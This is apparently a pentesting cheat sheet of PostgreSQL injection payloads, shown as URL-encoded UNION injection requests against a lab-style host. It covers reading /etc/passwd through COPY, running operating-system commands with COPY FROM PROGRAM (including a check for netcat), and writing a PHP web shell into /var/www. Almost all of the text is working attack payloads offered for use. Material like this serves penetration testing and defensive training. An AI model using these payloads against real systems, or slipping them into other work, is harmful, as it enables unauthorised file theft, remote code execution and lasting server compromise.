# PostgreSQL Injection

## Read Files

1. Create a new table: `CREATE TABLE cracked(data TEXT);`
2. Copy target file contents into the table: `COPY cracked FROM '/etc/passwd';`
3. Read table contents: `select data from cracked;`

**2-Step Example:**

    http://10.10.10.4/index.php?search=abc%27%20union%20all%20select%20null,null,null,null,null;%20CREATE%20TABLE%20cracked(data%20TEXT);%20COPY%20cracked%20FROM%20%27/etc/passwd%27;%20--#
    http://10.10.10.4/index.php?search=abc%27%20union%20all%20select%20null,data,null,null,null%20from%20cracked;%20--#

## Command Execution

1. Create a fresh table: `DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);`
2. Run system command: `COPY cmd_exec FROM PROGRAM 'id';`
3. View command output: `SELECT cmd_output FROM cmd_exec;`

**2-Step Example:**

    http://10.10.10.4/index.php?search=abc%27%20union%20all%20select%20null,null,null,null,null;%20DROP%20TABLE%20IF%20EXISTS%20cmd_exec;%20CREATE%20TABLE%20cmd_exec(cmd_output%20text);%20COPY%20cmd_exec%20FROM%20PROGRAM%20%27which%20nc%27;%20--#
    http://10.10.10.4/index.php?search=abc%27%20union%20all%20select%20null,cmd_output,null,null,null%20from%20cmd_exec;%20--#

## Shell Upload

If write permission is granted, new files can be created with desired file contents:

    http://10.10.10.4/index.php?search=abc' union all select null,null,null,null,null; CREATE TABLE pentestlab (t TEXT); INSERT INTO pentestlab(t) VALUES('<?php system($_GET["cmd"])?>'); COPY pentestlab(t) TO '/var/www/shell.php'; --#

## References

* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-file-read